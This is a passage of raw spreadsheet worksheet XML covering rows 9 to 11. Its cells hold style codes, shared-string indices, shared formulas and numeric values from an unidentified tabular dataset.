      <c r="DB9" s="340" t="str">
        <f t="shared" si="10"/>
        <v>-, -</v>
      </c>
      <c r="DC9" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD9" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE9" s="340">
        <v>0</v>
      </c>
      <c r="DF9" s="341">
        <v>26</v>
      </c>
      <c r="DG9" s="341">
        <v>9</v>
      </c>
      <c r="DH9" s="341">
        <v>0</v>
      </c>
      <c r="DI9" s="341">
        <v>0</v>
      </c>
      <c r="DJ9" s="341">
        <f t="shared" si="11"/>
        <v>0</v>
      </c>
      <c r="DK9" s="341">
        <v>17</v>
      </c>
      <c r="DL9" s="341">
        <v>0</v>
      </c>
      <c r="DM9" s="341">
        <v>28</v>
      </c>
      <c r="DN9" s="341">
        <v>6</v>
      </c>
      <c r="DO9" s="341">
        <v>34</v>
      </c>
      <c r="DP9" s="342">
        <v>0</v>
      </c>
      <c r="DQ9" s="355">
        <v>76</v>
      </c>
      <c r="DR9" s="356">
        <v>0</v>
      </c>
      <c r="DS9" s="356" t="s">
        <v>308</v>
      </c>
      <c r="DT9" s="356">
        <v>5</v>
      </c>
      <c r="DU9" s="356"/>
      <c r="DV9" s="356" t="s">
        <v>308</v>
      </c>
      <c r="DW9" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX9" s="356" t="s">
        <v>308</v>
      </c>
      <c r="DY9" s="356" t="str">
        <f t="shared" si="12"/>
        <v>-, -</v>
      </c>
      <c r="DZ9" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EA9" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB9" s="356">
        <v>0</v>
      </c>
      <c r="EC9" s="357">
        <v>25</v>
      </c>
      <c r="ED9" s="357">
        <v>14</v>
      </c>
      <c r="EE9" s="357">
        <v>0</v>
      </c>
      <c r="EF9" s="357">
        <v>0</v>
      </c>
      <c r="EG9" s="357">
        <f t="shared" si="13"/>
        <v>0</v>
      </c>
      <c r="EH9" s="357">
        <v>26</v>
      </c>
      <c r="EI9" s="357">
        <v>0</v>
      </c>
      <c r="EJ9" s="357">
        <v>28</v>
      </c>
      <c r="EK9" s="357">
        <v>48</v>
      </c>
      <c r="EL9" s="357">
        <v>76</v>
      </c>
      <c r="EM9" s="358">
        <v>0</v>
      </c>
      <c r="EN9" s="368" t="str">
        <f t="shared" si="1"/>
        <v>SI</v>
      </c>
      <c r="EO9" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP9" s="369"/>
      <c r="EQ9" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER9" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES9" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET9" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU9" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV9" s="369"/>
      <c r="EW9" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX9" s="369"/>
      <c r="EY9" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ9" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA9" s="369"/>
      <c r="FB9" s="369"/>
      <c r="FC9" s="369">
        <v>23</v>
      </c>
      <c r="FD9" s="369">
        <f t="shared" si="2"/>
        <v>0</v>
      </c>
      <c r="FE9" s="369">
        <v>0</v>
      </c>
      <c r="FF9" s="369">
        <v>0</v>
      </c>
      <c r="FG9" s="369">
        <v>0</v>
      </c>
      <c r="FH9" s="370" t="s">
        <v>309</v>
      </c>
      <c r="FI9" s="377" t="str">
        <f t="shared" si="3"/>
        <v>SI</v>
      </c>
      <c r="FJ9" s="378">
        <v>2</v>
      </c>
      <c r="FK9" s="378"/>
      <c r="FL9" s="378">
        <v>31914</v>
      </c>
      <c r="FM9" s="378">
        <v>1</v>
      </c>
      <c r="FN9" s="378"/>
      <c r="FO9" s="378">
        <v>31914</v>
      </c>
      <c r="FP9" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ9" s="378"/>
      <c r="FR9" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FS9" s="378"/>
      <c r="FT9" s="378"/>
      <c r="FU9" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV9" s="378"/>
      <c r="FW9" s="378"/>
      <c r="FX9" s="378">
        <v>24</v>
      </c>
      <c r="FY9" s="378">
        <f t="shared" si="4"/>
        <v>0</v>
      </c>
      <c r="FZ9" s="378">
        <v>0</v>
      </c>
      <c r="GA9" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB9" s="378">
        <v>0</v>
      </c>
      <c r="GC9" s="379" t="s">
        <v>310</v>
      </c>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40"/>
      <c r="HV9" s="40"/>
      <c r="HW9" s="40"/>
      <c r="HX9" s="40"/>
      <c r="HY9" s="40"/>
      <c r="HZ9" s="40"/>
      <c r="IA9" s="40"/>
      <c r="IB9" s="40"/>
      <c r="IC9" s="40"/>
      <c r="ID9" s="40"/>
      <c r="IE9" s="40"/>
      <c r="IF9" s="40"/>
      <c r="IG9" s="40"/>
      <c r="IH9" s="40"/>
      <c r="II9" s="40"/>
      <c r="IJ9" s="40"/>
      <c r="IK9" s="40"/>
      <c r="IL9" s="40"/>
      <c r="IM9" s="40"/>
      <c r="IN9" s="40"/>
      <c r="IO9" s="40"/>
      <c r="IP9" s="40"/>
      <c r="IQ9" s="40"/>
      <c r="IR9" s="40"/>
      <c r="IS9" s="40"/>
      <c r="IT9" s="40"/>
      <c r="IU9" s="40"/>
      <c r="IV9" s="40"/>
      <c r="IW9" s="40"/>
      <c r="IX9" s="40"/>
      <c r="IY9" s="40"/>
      <c r="IZ9" s="40"/>
      <c r="JA9" s="40"/>
      <c r="JB9" s="40"/>
      <c r="JC9" s="40"/>
      <c r="JD9" s="40"/>
      <c r="JE9" s="40"/>
      <c r="JF9" s="40"/>
      <c r="JG9" s="40"/>
      <c r="JH9" s="40"/>
      <c r="JI9" s="40"/>
      <c r="JJ9" s="40"/>
      <c r="JK9" s="40"/>
      <c r="JL9" s="40"/>
      <c r="JM9" s="40"/>
      <c r="JN9" s="40"/>
      <c r="JO9" s="40"/>
      <c r="JP9" s="40"/>
      <c r="JQ9" s="40"/>
      <c r="JR9" s="40"/>
      <c r="JS9" s="40"/>
      <c r="JT9" s="40"/>
      <c r="JU9" s="40"/>
      <c r="JV9" s="40"/>
      <c r="JW9" s="40"/>
      <c r="JX9" s="40"/>
      <c r="JY9" s="40"/>
      <c r="JZ9" s="40"/>
      <c r="KA9" s="40"/>
      <c r="KB9" s="40"/>
      <c r="KC9" s="40"/>
      <c r="KD9" s="40"/>
      <c r="KE9" s="40"/>
      <c r="KF9" s="40"/>
      <c r="KG9" s="40"/>
      <c r="KH9" s="40"/>
      <c r="KI9" s="40"/>
      <c r="KJ9" s="40"/>
      <c r="KK9" s="40"/>
      <c r="KL9" s="40"/>
      <c r="KM9" s="40"/>
      <c r="KN9" s="40"/>
      <c r="KO9" s="40"/>
      <c r="KP9" s="40"/>
      <c r="KQ9" s="40"/>
      <c r="KR9" s="40"/>
      <c r="KS9" s="40"/>
      <c r="KT9" s="40"/>
      <c r="KU9" s="40"/>
      <c r="KV9" s="40"/>
      <c r="KW9" s="40"/>
      <c r="KX9" s="40"/>
      <c r="KY9" s="40"/>
      <c r="KZ9" s="40"/>
      <c r="LA9" s="40"/>
      <c r="LB9" s="40"/>
      <c r="LC9" s="40"/>
      <c r="LD9" s="40"/>
      <c r="LE9" s="40"/>
      <c r="LF9" s="40"/>
      <c r="LG9" s="40"/>
      <c r="LH9" s="40"/>
      <c r="LI9" s="40"/>
    </row>
    <row r="10" spans="1:321" ht="39.950000000000003" customHeight="1">
      <c r="B10" s="224" t="s">
        <v>311</v>
      </c>
      <c r="C10" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D10" s="225" t="s">
        <v>312</v>
      </c>
      <c r="E10" s="225" t="s">
        <v>313</v>
      </c>
      <c r="F10" s="225">
        <v>7</v>
      </c>
      <c r="G10" s="225" t="s">
        <v>314</v>
      </c>
      <c r="H10" s="225" t="s">
        <v>185</v>
      </c>
      <c r="I10" s="225">
        <v>10</v>
      </c>
      <c r="J10" s="225" t="s">
        <v>315</v>
      </c>
      <c r="K10" s="227" t="s">
        <v>316</v>
      </c>
      <c r="L10" s="228" t="s">
        <v>185</v>
      </c>
      <c r="M10" s="227" t="s">
        <v>185</v>
      </c>
      <c r="N10" s="227" t="s">
        <v>317</v>
      </c>
      <c r="O10" s="389" t="s">
        <v>2669</v>
      </c>
      <c r="P10" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q10" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R10" s="225"/>
      <c r="S10" s="396"/>
      <c r="T10" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U10" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V10" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W10" s="231"/>
      <c r="X10" s="232" t="s">
        <v>13</v>
      </c>
      <c r="Y10" s="255" t="s">
        <v>236</v>
      </c>
      <c r="Z10" s="256" t="s">
        <v>318</v>
      </c>
      <c r="AA10" s="257" t="s">
        <v>2413</v>
      </c>
      <c r="AB10" s="256" t="s">
        <v>2525</v>
      </c>
      <c r="AC10" s="226" t="s">
        <v>12</v>
      </c>
      <c r="AD10" s="258" t="s">
        <v>269</v>
      </c>
      <c r="AE10" s="259" t="s">
        <v>322</v>
      </c>
      <c r="AF10" s="270" t="s">
        <v>319</v>
      </c>
      <c r="AG10" s="225" t="s">
        <v>320</v>
      </c>
      <c r="AH10" s="272" t="s">
        <v>321</v>
      </c>
      <c r="AI10" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ10" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK10" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL10" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM10" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN10" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO10" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP10" s="230"/>
      <c r="AQ10" s="230"/>
      <c r="AR10" s="288">
        <v>1</v>
      </c>
      <c r="AS10" s="288">
        <v>1</v>
      </c>
      <c r="AT10" s="288">
        <v>0</v>
      </c>
      <c r="AU10" s="288">
        <f t="shared" si="5"/>
        <v>1</v>
      </c>
      <c r="AV10" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW10" s="288">
        <v>1</v>
      </c>
      <c r="AX10" s="288">
        <v>1</v>
      </c>
      <c r="AY10" s="288">
        <v>0</v>
      </c>
      <c r="AZ10" s="288">
        <f t="shared" si="0"/>
        <v>1</v>
      </c>
      <c r="BA10" s="289"/>
      <c r="BB10" s="301">
        <v>0</v>
      </c>
      <c r="BC10" s="302">
        <v>0</v>
      </c>
      <c r="BD10" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BE10" s="302">
        <v>0</v>
      </c>
      <c r="BF10" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG10" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BH10" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI10" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BJ10" s="302" t="str">
        <f t="shared" si="6"/>
        <v>-, -</v>
      </c>
      <c r="BK10" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL10" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM10" s="302">
        <v>0</v>
      </c>
      <c r="BN10" s="304">
        <v>1</v>
      </c>
      <c r="BO10" s="304">
        <v>0</v>
      </c>
      <c r="BP10" s="304">
        <v>0</v>
      </c>
      <c r="BQ10" s="304">
        <v>0</v>
      </c>
      <c r="BR10" s="304">
        <f t="shared" si="7"/>
        <v>0</v>
      </c>
      <c r="BS10" s="304">
        <v>0</v>
      </c>
      <c r="BT10" s="304">
        <v>0</v>
      </c>
      <c r="BU10" s="304">
        <v>0</v>
      </c>
      <c r="BV10" s="305">
        <v>0</v>
      </c>
      <c r="BW10" s="317">
        <v>0</v>
      </c>
      <c r="BX10" s="318">
        <v>0</v>
      </c>
      <c r="BY10" s="318" t="s">
        <v>12</v>
      </c>
      <c r="BZ10" s="318">
        <v>0</v>
      </c>
      <c r="CA10" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB10" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CC10" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD10" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CE10" s="318" t="str">
        <f t="shared" si="8"/>
        <v>-, -</v>
      </c>
      <c r="CF10" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG10" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH10" s="318">
        <v>0</v>
      </c>
      <c r="CI10" s="319">
        <v>1</v>
      </c>
      <c r="CJ10" s="319">
        <v>0</v>
      </c>
      <c r="CK10" s="319">
        <v>0</v>
      </c>
      <c r="CL10" s="319">
        <v>0</v>
      </c>
      <c r="CM10" s="319">
        <f t="shared" si="9"/>
        <v>0</v>
      </c>
      <c r="CN10" s="319">
        <v>0</v>
      </c>
      <c r="CO10" s="319">
        <v>0</v>
      </c>
      <c r="CP10" s="319">
        <v>0</v>
      </c>
      <c r="CQ10" s="319">
        <v>0</v>
      </c>
      <c r="CR10" s="319">
        <v>0</v>
      </c>
      <c r="CS10" s="320">
        <v>0</v>
      </c>
      <c r="CT10" s="339">
        <v>0</v>
      </c>
      <c r="CU10" s="340">
        <v>0</v>
      </c>
      <c r="CV10" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CW10" s="340">
        <v>0</v>
      </c>
      <c r="CX10" s="340"/>
      <c r="CY10" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CZ10" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA10" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DB10" s="340" t="str">
        <f t="shared" si="10"/>
        <v>-, -</v>
      </c>
      <c r="DC10" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD10" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE10" s="340">
        <v>0</v>
      </c>
      <c r="DF10" s="341">
        <v>1</v>
      </c>
      <c r="DG10" s="341">
        <v>0</v>
      </c>
      <c r="DH10" s="341">
        <v>0</v>
      </c>
      <c r="DI10" s="341">
        <v>0</v>
      </c>
      <c r="DJ10" s="341">
        <f t="shared" si="11"/>
        <v>0</v>
      </c>
      <c r="DK10" s="341">
        <v>0</v>
      </c>
      <c r="DL10" s="341">
        <v>0</v>
      </c>
      <c r="DM10" s="341">
        <v>0</v>
      </c>
      <c r="DN10" s="341">
        <v>0</v>
      </c>
      <c r="DO10" s="341">
        <v>0</v>
      </c>
      <c r="DP10" s="342">
        <v>0</v>
      </c>
      <c r="DQ10" s="355">
        <v>4</v>
      </c>
      <c r="DR10" s="356">
        <v>0</v>
      </c>
      <c r="DS10" s="356" t="s">
        <v>196</v>
      </c>
      <c r="DT10" s="356">
        <v>2</v>
      </c>
      <c r="DU10" s="356"/>
      <c r="DV10" s="356" t="s">
        <v>196</v>
      </c>
      <c r="DW10" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX10" s="356" t="s">
        <v>196</v>
      </c>
      <c r="DY10" s="356" t="str">
        <f t="shared" si="12"/>
        <v>-, -</v>
      </c>
      <c r="DZ10" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EA10" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB10" s="356">
        <v>0</v>
      </c>
      <c r="EC10" s="357">
        <v>1</v>
      </c>
      <c r="ED10" s="357">
        <v>1</v>
      </c>
      <c r="EE10" s="357">
        <v>0</v>
      </c>
      <c r="EF10" s="357">
        <v>0</v>
      </c>
      <c r="EG10" s="357">
        <f t="shared" si="13"/>
        <v>0</v>
      </c>
      <c r="EH10" s="357">
        <v>1</v>
      </c>
      <c r="EI10" s="357">
        <v>0</v>
      </c>
      <c r="EJ10" s="357">
        <v>0</v>
      </c>
      <c r="EK10" s="357">
        <v>4</v>
      </c>
      <c r="EL10" s="357">
        <v>4</v>
      </c>
      <c r="EM10" s="358">
        <v>0</v>
      </c>
      <c r="EN10" s="368" t="str">
        <f t="shared" si="1"/>
        <v>SI</v>
      </c>
      <c r="EO10" s="369"/>
      <c r="EP10" s="369"/>
      <c r="EQ10" s="369"/>
      <c r="ER10" s="369"/>
      <c r="ES10" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET10" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU10" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV10" s="369"/>
      <c r="EW10" s="369">
        <v>16060</v>
      </c>
      <c r="EX10" s="369"/>
      <c r="EY10" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ10" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA10" s="369"/>
      <c r="FB10" s="369"/>
      <c r="FC10" s="369">
        <v>1</v>
      </c>
      <c r="FD10" s="369">
        <f t="shared" si="2"/>
        <v>1</v>
      </c>
      <c r="FE10" s="369">
        <v>0</v>
      </c>
      <c r="FF10" s="369">
        <v>1</v>
      </c>
      <c r="FG10" s="369">
        <v>1</v>
      </c>
      <c r="FH10" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI10" s="377" t="str">
        <f t="shared" si="3"/>
        <v>SI</v>
      </c>
      <c r="FJ10" s="378">
        <v>1</v>
      </c>
      <c r="FK10" s="378"/>
      <c r="FL10" s="378">
        <v>31914</v>
      </c>
      <c r="FM10" s="378">
        <v>1</v>
      </c>
      <c r="FN10" s="378"/>
      <c r="FO10" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP10" s="378">
        <v>31914</v>
      </c>
      <c r="FQ10" s="378"/>
      <c r="FR10" s="378" t="s">
        <v>185</v>
      </c>
      <c r="FS10" s="378"/>
      <c r="FT10" s="378"/>
      <c r="FU10" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV10" s="378"/>
      <c r="FW10" s="378"/>
      <c r="FX10" s="378">
        <v>1</v>
      </c>
      <c r="FY10" s="378">
        <f t="shared" si="4"/>
        <v>1</v>
      </c>
      <c r="FZ10" s="378">
        <v>1</v>
      </c>
      <c r="GA10" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB10" s="378">
        <v>1</v>
      </c>
      <c r="GC10" s="379" t="s">
        <v>323</v>
      </c>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40"/>
      <c r="IO10" s="40"/>
      <c r="IP10" s="40"/>
      <c r="IQ10" s="40"/>
      <c r="IR10" s="40"/>
      <c r="IS10" s="40"/>
      <c r="IT10" s="40"/>
      <c r="IU10" s="40"/>
      <c r="IV10" s="40"/>
      <c r="IW10" s="40"/>
      <c r="IX10" s="40"/>
      <c r="IY10" s="40"/>
      <c r="IZ10" s="40"/>
      <c r="JA10" s="40"/>
      <c r="JB10" s="40"/>
      <c r="JC10" s="40"/>
      <c r="JD10" s="40"/>
      <c r="JE10" s="40"/>
      <c r="JF10" s="40"/>
      <c r="JG10" s="40"/>
      <c r="JH10" s="40"/>
      <c r="JI10" s="40"/>
      <c r="JJ10" s="40"/>
      <c r="JK10" s="40"/>
      <c r="JL10" s="40"/>
      <c r="JM10" s="40"/>
      <c r="JN10" s="40"/>
      <c r="JO10" s="40"/>
      <c r="JP10" s="40"/>
      <c r="JQ10" s="40"/>
      <c r="JR10" s="40"/>
      <c r="JS10" s="40"/>
      <c r="JT10" s="40"/>
      <c r="JU10" s="40"/>
      <c r="JV10" s="40"/>
      <c r="JW10" s="40"/>
      <c r="JX10" s="40"/>
      <c r="JY10" s="40"/>
      <c r="JZ10" s="40"/>
      <c r="KA10" s="40"/>
      <c r="KB10" s="40"/>
      <c r="KC10" s="40"/>
      <c r="KD10" s="40"/>
      <c r="KE10" s="40"/>
      <c r="KF10" s="40"/>
      <c r="KG10" s="40"/>
      <c r="KH10" s="40"/>
      <c r="KI10" s="40"/>
      <c r="KJ10" s="40"/>
      <c r="KK10" s="40"/>
      <c r="KL10" s="40"/>
      <c r="KM10" s="40"/>
      <c r="KN10" s="40"/>
      <c r="KO10" s="40"/>
      <c r="KP10" s="40"/>
      <c r="KQ10" s="40"/>
      <c r="KR10" s="40"/>
      <c r="KS10" s="40"/>
      <c r="KT10" s="40"/>
      <c r="KU10" s="40"/>
      <c r="KV10" s="40"/>
      <c r="KW10" s="40"/>
      <c r="KX10" s="40"/>
      <c r="KY10" s="40"/>
      <c r="KZ10" s="40"/>
      <c r="LA10" s="40"/>
      <c r="LB10" s="40"/>
      <c r="LC10" s="40"/>
      <c r="LD10" s="40"/>
      <c r="LE10" s="40"/>
      <c r="LF10" s="40"/>
      <c r="LG10" s="40"/>
      <c r="LH10" s="40"/>
      <c r="LI10" s="40"/>
    </row>
    <row r="11" spans="1:321" ht="39.950000000000003" customHeight="1">
      <c r="B11" s="224" t="s">
        <v>256</v>
      </c>
      <c r="C11" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D11" s="225" t="s">
        <v>257</v>
      </c>
      <c r="E11" s="225" t="s">
        <v>324</v>
      </c>
      <c r="F11" s="225">
        <v>8</v>
      </c>
      <c r="G11" s="225" t="s">
        <v>325</v>
      </c>
      <c r="H11" s="226" t="s">
        <v>12</v>
      </c>
      <c r="I11" s="225"/>
      <c r="J11" s="225" t="s">
        <v>12</v>
      </c>
      <c r="K11" s="227" t="s">
        <v>326</v>
      </c>
      <c r="L11" s="228" t="s">
        <v>329</v>
      </c>
      <c r="M11" s="227" t="s">
        <v>327</v>
      </c>
      <c r="N11" s="227" t="s">
        <v>328</v>
      </c>
      <c r="O11" s="389" t="s">
        <v>2670</v>
      </c>
      <c r="P11" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q11" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R11" s="225"/>
      <c r="S11" s="396"/>
      <c r="T11" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U11" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V11" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W11" s="231"/>
      <c r="X11" s="232" t="s">
        <v>192</v>
      </c>
      <c r="Y11" s="255" t="s">
        <v>186</v>
      </c>
      <c r="Z11" s="256" t="s">
        <v>331</v>
      </c>
      <c r="AA11" s="257" t="s">
        <v>2411</v>
      </c>
      <c r="AB11" s="256" t="s">
        <v>2414</v>
      </c>
      <c r="AC11" s="226" t="s">
        <v>12</v>
      </c>
      <c r="AD11" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE11" s="259" t="s">
        <v>335</v>
      </c>
      <c r="AF11" s="270" t="s">
        <v>332</v>
      </c>
      <c r="AG11" s="225" t="s">
        <v>333</v>
      </c>
      <c r="AH11" s="271" t="s">
        <v>334</v>
      </c>
      <c r="AI11" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ11" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK11" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL11" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM11" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN11" s="281" t="s">
        <v>13</v>
      </c>
      <c r="AO11" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP11" s="230"/>
      <c r="AQ11" s="230"/>
      <c r="AR11" s="288">
        <v>9</v>
      </c>
      <c r="AS11" s="288">
        <v>1</v>
      </c>
      <c r="AT11" s="288">
        <v>1</v>
      </c>
      <c r="AU11" s="288">
        <f t="shared" si="5"/>
        <v>2</v>
      </c>
      <c r="AV11" s="256" t="s">
        <v>330</v>
      </c>
      <c r="AW11" s="288">
        <v>1</v>
      </c>
      <c r="AX11" s="288">
        <v>1</v>
      </c>
      <c r="AY11" s="288">
        <v>1</v>
      </c>
      <c r="AZ11" s="288">
        <f t="shared" si="0"/>
        <v>2</v>
      </c>
      <c r="BA11" s="289"/>
      <c r="BB11" s="301">
        <v>16</v>
      </c>
      <c r="BC11" s="302">
        <v>0</v>
      </c>
      <c r="BD11" s="302">
        <v>1917</v>
      </c>
      <c r="BE11" s="302">
        <v>1</v>
      </c>
      <c r="BF11" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG11" s="302">
        <v>1917</v>
      </c>
      <c r="BH11" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI11" s="302">
        <v>1917</v>
      </c>
      <c r="BJ11" s="302" t="str">
        <f t="shared" si="6"/>
        <v>-, -</v>
      </c>
      <c r="BK11" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL11" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM11" s="302">
        <v>0</v>
      </c>
      <c r="BN11" s="304">
        <v>9</v>
      </c>
      <c r="BO11" s="304">
        <v>4</v>
      </c>
      <c r="BP11" s="304">
        <v>0</v>
      </c>
      <c r="BQ11" s="304">
        <v>0</v>
      </c>
      <c r="BR11" s="304">
        <f t="shared" si="7"/>
        <v>0</v>
      </c>
      <c r="BS11" s="304">
        <v>16</v>
      </c>
      <c r="BT11" s="304">
        <v>0</v>
      </c>
      <c r="BU11" s="304">
        <v>16</v>
      </c>
      <c r="BV11" s="305">
        <v>0</v>
      </c>
      <c r="BW11" s="317">
        <v>18</v>
      </c>
      <c r="BX11" s="318">
        <v>2</v>
      </c>
      <c r="BY11" s="323" t="s">
        <v>336</v>
      </c>
      <c r="BZ11" s="318">
        <v>3</v>
      </c>
      <c r="CA11" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB11" s="323" t="s">
        <v>336</v>
      </c>
      <c r="CC11" s="323" t="s">
        <v>337</v>
      </c>
      <c r="CD11" s="318">
        <v>1917</v>
      </c>
      <c r="CE11" s="318" t="str">
        <f t="shared" si="8"/>
        <v>2027792, 2027793, -</v>
      </c>
      <c r="CF11" s="323" t="s">
        <v>337</v>
      </c>
      <c r="CG11" s="323" t="s">
        <v>12</v>
      </c>
      <c r="CH11" s="318">
        <v>2</v>
      </c>
      <c r="CI11" s="319">
        <v>9</v>
      </c>
      <c r="CJ11" s="319">
        <v>5</v>
      </c>
      <c r="CK11" s="319">
        <v>0</v>
      </c>
      <c r="CL11" s="319">
        <v>1</v>
      </c>
      <c r="CM11" s="319">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="CN11" s="319">
        <v>18</v>
      </c>
      <c r="CO11" s="319">
        <v>0</v>
      </c>
      <c r="CP11" s="319">
        <v>16</v>
      </c>
      <c r="CQ11" s="319">
        <v>2</v>
      </c>
      <c r="CR11" s="319">
        <v>18</v>
      </c>
      <c r="CS11" s="320">
        <v>0</v>
      </c>
      <c r="CT11" s="339">
        <v>18</v>
      </c>
      <c r="CU11" s="340">
        <v>2</v>
      </c>
      <c r="CV11" s="343" t="s">
        <v>336</v>
      </c>
      <c r="CW11" s="340">
        <v>3</v>
      </c>
      <c r="CX11" s="340"/>
      <c r="CY11" s="343" t="s">
        <v>336</v>
      </c>
      <c r="CZ11" s="343" t="s">
        <v>337</v>
      </c>
      <c r="DA11" s="343">
        <v>1917</v>
      </c>
      <c r="DB11" s="340" t="str">
        <f t="shared" si="10"/>
        <v>2027792, 2027793, -</v>
      </c>
      <c r="DC11" s="343" t="s">
        <v>337</v>
      </c>
      <c r="DD11" s="343" t="s">
        <v>12</v>
      </c>
      <c r="DE11" s="340">
        <v>2</v>
      </c>
      <c r="DF11" s="341">
        <v>9</v>
      </c>
      <c r="DG11" s="341">
        <v>5</v>
      </c>
      <c r="DH11" s="341">
        <v>0</v>
      </c>
      <c r="DI11" s="341">
        <v>1</v>
      </c>
      <c r="DJ11" s="341">
        <f t="shared" si="11"/>
        <v>1</v>
      </c>
      <c r="DK11" s="341">
        <v>18</v>
      </c>
      <c r="DL11" s="341">
        <v>0</v>
      </c>
      <c r="DM11" s="341">
        <v>16</v>
      </c>
      <c r="DN11" s="341">
        <v>2</v>
      </c>
      <c r="DO11" s="341">
        <v>18</v>
      </c>
      <c r="DP11" s="342">
        <v>0</v>
      </c>
      <c r="DQ11" s="355">
        <v>36</v>
      </c>
      <c r="DR11" s="356">
        <v>2</v>
      </c>
      <c r="DS11" s="356" t="s">
        <v>338</v>
      </c>
      <c r="DT11" s="356">
        <v>6</v>
      </c>
      <c r="DU11" s="356"/>
      <c r="DV11" s="356" t="s">
        <v>339</v>
      </c>
      <c r="DW11" s="359" t="s">
        <v>337</v>
      </c>
      <c r="DX11" s="356" t="s">
        <v>340</v>
      </c>
      <c r="DY11" s="356" t="str">
        <f t="shared" si="12"/>
        <v>2027792, 2027793, -</v>
      </c>
      <c r="DZ11" s="359" t="s">
        <v>337</v>
      </c>
      <c r="EA11" s="359" t="s">
        <v>12</v>
      </c>
      <c r="EB11" s="356">
        <v>2</v>
      </c>
      <c r="EC11" s="357">
        <v>9</v>
      </c>
      <c r="ED11" s="357">
        <v>5</v>
      </c>
      <c r="EE11" s="357">
        <v>0</v>
      </c>
      <c r="EF11" s="357">
        <v>1</v>
      </c>
      <c r="EG11" s="357">
        <f t="shared" si="13"/>
        <v>1</v>
      </c>
      <c r="EH11" s="357">
        <v>19</v>
      </c>
      <c r="EI11" s="357">
        <v>0</v>
      </c>
      <c r="EJ11" s="357">
        <v>16</v>
      </c>
      <c r="EK11" s="357">
        <v>20</v>
      </c>
      <c r="EL11" s="357">
        <v>20</v>
      </c>
      <c r="EM11" s="358">
        <v>0</v>
      </c>
      <c r="EN11" s="368" t="str">
        <f t="shared" si="1"/>
        <v>SI</v>
      </c>
      <c r="EO11" s="369">
        <v>6</v>
      </c>
      <c r="EP11" s="369"/>
      <c r="EQ11" s="369">
        <v>52169</v>
      </c>
      <c r="ER11" s="369">
        <v>1</v>
      </c>
      <c r="ES11" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET11" s="369" t="s">
        <v>12</v>
      </c>
